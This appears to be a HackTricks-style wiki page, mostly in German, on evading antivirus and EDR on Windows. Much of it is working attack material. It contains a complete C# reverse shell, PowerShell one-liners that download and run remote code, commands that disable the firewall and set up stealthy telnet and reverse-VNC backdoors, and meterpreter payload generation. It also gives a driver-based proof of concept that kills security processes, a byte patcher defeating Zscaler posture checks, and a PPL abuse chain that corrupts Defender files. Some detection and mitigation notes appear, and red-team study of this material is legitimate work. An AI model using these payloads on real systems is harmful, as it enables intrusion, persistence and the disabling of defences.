Evasion ist ein sehr komplexes Thema; manchmal muss man viele verschiedene Telemetriequellen in nur einem System berücksichtigen, weshalb es in ausgereiften Umgebungen nahezu unmöglich ist, vollständig unentdeckt zu bleiben.

Jede Zielumgebung hat ihre eigenen Stärken und Schwächen.

Ich empfehle dringend, dir diesen Talk von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Evasion-Techniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Das ist auch ein weiterer großartiger Talk von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden, das **Teile der Binary entfernt**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt und es dir aufteilt.\
Ein weiteres Tool, das **dasselbe macht, ist** [**avred**](https://github.com/dobin/avred) mit einem offenen Web-Service unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

Bis Windows10 hatten alle Windows-Versionen einen **Telnet-Server**, den man (als Administrator) installieren konnte, indem man:
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
Lass es beim Systemstart **starten** und **führe** es jetzt aus:
```bash
sc config TlntSVR start= auto obj= localsystem
```
**Ändere den telnet-Port** (stealth) und deaktiviere die Firewall:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Herunterladen von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du willst die bin-Downloads, nicht das Setup)

**ON THE HOST**: Execute _**winvnc.exe**_ und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Setze ein Passwort in _VNC Password_
- Setze ein Passwort in _View-Only Password_

Verschiebe dann die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ in das **victim**

#### **Reverse connection**

Der **attacker** sollte **auf seinem** **host** das Binary `vncviewer.exe -listen 5900` ausführen, damit es bereit ist, eine reverse **VNC connection** zu empfangen. Dann auf dem **victim**: Starte den winvnc-Daemon `winvnc.exe -run` und führe `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` aus

**WARNUNG:** Um unauffällig zu bleiben, darfst du ein paar Dinge nicht tun

- Starte `winvnc` nicht, wenn es bereits läuft, sonst löst du ein [popup](https://i.imgur.com/1SROTTl.png) aus. Prüfe, ob es läuft mit `tasklist | findstr winvnc`
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, sonst öffnet sich das [Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png)
- Führe `winvnc -h` nicht zur Hilfe aus, sonst löst du ein [popup](https://i.imgur.com/oc18wcu.png) aus

### GreatSCT

Herunterladen von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Innerhalb von GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Starten Sie nun den **lister** mit `msfconsole -r file.rc` und führen Sie die **xml payload** mit folgendem Befehl aus:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**Der aktuelle Defender wird den Prozess sehr schnell beenden.**

### Unsere eigene reverse shell kompilieren

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C# Revershell

Kompiliere es mit:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Verwenden Sie es mit:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# using Compiler
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C# obfuscators: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel: Verwendung von Python zum Erstellen von injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### More

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Killing AV/EDR From Kernel Space

Storm-2603 leveraged a tiny console utility known as **Antivirus Terminator** to disable endpoint protections before dropping ransomware. The tool brings its **own vulnerable but *signed* driver** and abuses it to issue privileged kernel operations that even Protected-Process-Light (PPL) AV services cannot block.

Wesentliche Erkenntnisse
1. **Signed driver**: The file delivered to disk is `ServiceMouse.sys`, but the binary is the legitimately signed driver `AToolsKrnl64.sys` from Antiy Labs’ “System In-Depth Analysis Toolkit”. Because the driver bears a valid Microsoft signature it loads even when Driver-Signature-Enforcement (DSE) is enabled.
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
Die erste Zeile registriert den Treiber als **Kernel-Service** und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **IOCTLs exposed by the driver**
| IOCTL code | Fähigkeit                              |
|-----------:|-----------------------------------------|
| `0x99000050` | Beende einen beliebigen Prozess per PID (wurde verwendet, um Defender/EDR-Dienste zu beenden) |
| `0x990000D0` | Löscht eine beliebige Datei auf der Festplatte |
| `0x990001D0` | Entlädt den Treiber und entfernt den Service |

Minimales C Proof-of-Concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **Why it works**:  BYOVD skips user-mode protections entirely; code that executes in the kernel can open *protected* processes, terminate them, or tamper with kernel objects irrespective of PPL/PP, ELAM or other hardening features.

Erkennung / Gegenmaßnahmen
•  Aktivieren Sie Microsofts Blockliste für verwundbare Treiber (`HVCI`, `Smart App Control`), damit Windows das Laden von `AToolsKrnl64.sys` verweigert.  
•  Überwachen Sie die Erstellung neuer *Kernel*-Services und alarmieren Sie, wenn ein Treiber aus einem weltweit beschreibbaren Verzeichnis geladen wird oder nicht auf der Allow-Liste steht.  
•  Achten Sie auf User-Mode-Handles zu benutzerdefinierten Device-Objekten, gefolgt von verdächtigen `DeviceIoControl`-Aufrufen.

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler’s **Client Connector** applies device-posture rules locally and relies on Windows RPC to communicate the results to other components. Two weak design choices make a full bypass possible:

1. Posture evaluation happens **entirely client-side** (a boolean is sent to the server).  
2. Internal RPC endpoints only validate that the connecting executable is **signed by Zscaler** (via `WinVerifyTrust`).

By **patching four signed binaries on disk** both mechanisms can be neutralised:

| Binary | Originale Logik gepatcht | Ergebnis |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Gibt immer `1` zurück, sodass jede Prüfung als konform gilt |
| `ZSAService.exe` | Indirekter Aufruf von `WinVerifyTrust` | NOP-ed ⇒ jeder Prozess (auch unsignierte) kann sich an die RPC-Pipes binden |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Ersetzt durch `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Integritätsprüfungen des Tunnels | Kurzgeschlossen |

Minimaler Auszug des Patchers:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
Nachdem die Originaldateien ersetzt und der Service-Stack neu gestartet wurden:

* **Alle** posture checks zeigen **grün/konform**.
* Nicht signierte oder modifizierte Binaries können die named-pipe RPC-Endpunkte öffnen (z. B. `\\RPC Control\\ZSATrayManager_talk_to_me`).
* Der kompromittierte Host erhält uneingeschränkten Zugriff auf das interne Netzwerk, das durch die Zscaler-Richtlinien definiert ist.

Diese Fallstudie zeigt, wie rein clientseitige Vertrauensentscheidungen und einfache Signaturprüfungen mit wenigen Byte-Patches ausgehebelt werden können.

## Missbrauch von Protected Process Light (PPL) To Tamper AV/EDR With LOLBINs

Protected Process Light (PPL) enforces a signer/level hierarchy so that only equal-or-higher protected processes can tamper with each other. Offensively, if you can legitimately launch a PPL-enabled binary and control its arguments, you can convert benign functionality (e.g., logging) into a constrained, PPL-backed write primitive against protected directories used by AV/EDR.

Voraussetzungen, damit ein Prozess als PPL ausgeführt wird
- Die Ziel-EXE (und alle geladenen DLLs) müssen mit einem PPL-fähigen EKU signiert sein.
- Der Prozess muss mit CreateProcess erstellt werden und dabei die Flags verwenden: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Ein kompatibles Protection-Level muss angefordert werden, das zum Signer der Binärdatei passt (z. B. `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` für Anti-Malware-Signer, `PROTECTION_LEVEL_WINDOWS` für Windows-Signer). Falsche Level führen zum Fehlschlag bei der Erstellung.

Siehe auch eine breitere Einführung zu PP/PPL und LSASS-Schutz hier:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher-Tools
- Open-Source-Helfer: CreateProcessAsPPL (wählt Protection-Level und leitet Argumente an die Ziel-EXE weiter):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- Nutzungsmuster:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- Die signierte System-Binärdatei `C:\Windows\System32\ClipUp.exe` startet sich selbst und akzeptiert einen Parameter, um eine Logdatei an einen vom Aufrufer angegebenen Pfad zu schreiben.
- Wenn sie als PPL-Prozess gestartet wird, erfolgt der Dateischreibvorgang mit PPL-Unterstützung.
- ClipUp kann Pfade mit Leerzeichen nicht parsen; verwende 8.3-Kurzpfade, um in normalerweise geschützte Orte zu zeigen.

8.3-Kurzpfad-Hilfen
- Kurznamen auflisten: `dir /x` in jedem übergeordneten Verzeichnis.
- Kurzpfad in cmd ableiten: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) Starte das PPL-fähige LOLBIN (ClipUp) mit `CREATE_PROTECTED_PROCESS` über einen Launcher (z. B. CreateProcessAsPPL).
2) Übergebe das ClipUp-Logpfad-Argument, um eine Dateierstellung in einem geschützten AV-Verzeichnis zu erzwingen (z. B. Defender Platform). Verwende bei Bedarf 8.3-Kurzpfade.
3) Wenn die Ziel-Binärdatei normalerweise vom AV während der Laufzeit offen/gesperrt ist (z. B. MsMpEng.exe), plane den Schreibvorgang beim Booten bevor der AV startet, indem du einen Auto-Start-Service installierst, der zuverlässig früher ausgeführt wird. Überprüfe die Bootreihenfolge mit Process Monitor (Boot-Logging).
4) Beim Neustart erfolgt der PPL-unterstützte Schreibvorgang, bevor der AV seine Binärdateien sperrt, wodurch die Zieldatei beschädigt wird und der Start verhindert wird.

Beispielaufruf (Pfade redigiert/gekürzt aus Sicherheitsgründen):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Hinweise und Einschränkungen
- Sie können den Inhalt, den ClipUp schreibt, nicht kontrollieren, nur die Platzierung; die Primitive eignet sich eher zur Korruption als zur präzisen Inhaltsinjektion.
- Erfordert local admin/SYSTEM, um einen Service zu installieren/zu starten, sowie ein Neustartfenster.
- Timing ist kritisch: das Ziel darf nicht geöffnet sein; Ausführung zur Bootzeit vermeidet Dateisperren.

Detections
- Prozess-Erstellung von `ClipUp.exe` mit ungewöhnlichen Argumenten, besonders wenn der Parent von nicht-standardmäßigen Startern stammt, rund um den Bootvorgang.
- Neue Services, die so konfiguriert sind, dass verdächtige Binaries automatisch gestartet werden und konsequent vor Defender/AV starten. Untersuchen Sie Service-Erstellung/-Änderungen vor Defender-Startup-Fehlern.
- Dateiintegritätsüberwachung auf Defender-Binaries/Platform-Verzeichnissen; unerwartete Datei-Erstellungen/-Änderungen durch Prozesse mit protected-process-Flags.
- ETW/EDR-Telemetrie: suchen Sie nach Prozessen, die mit `CREATE_PROTECTED_PROCESS` erstellt wurden, und nach anomalem PPL-Level-Einsatz durch Nicht-AV-Binaries.

Mitigations
- WDAC/Code Integrity: beschränken Sie, welche signierten Binaries als PPL ausgeführt werden dürfen und unter welchen Parent-Prozessen; blockieren Sie ClipUp-Aufrufe außerhalb legitimer Kontexte.
- Service-Hygiene: beschränken Sie die Erstellung/Änderung von Auto-Start-Services und überwachen Sie Manipulationen der Startreihenfolge.
- Stellen Sie sicher, dass Defender Tamper Protection und Early-Launch-Schutz aktiviert sind; untersuchen Sie Startfehler, die auf Binary-Korruption hinweisen.
- Erwägen Sie das Deaktivieren der 8.3-Kurz-Namensgenerierung auf Volumes, die Sicherheitstools hosten, sofern dies mit Ihrer Umgebung kompatibel ist (gründlich testen).

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## References

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)

{{#include ../banners/hacktricks-training.md}}
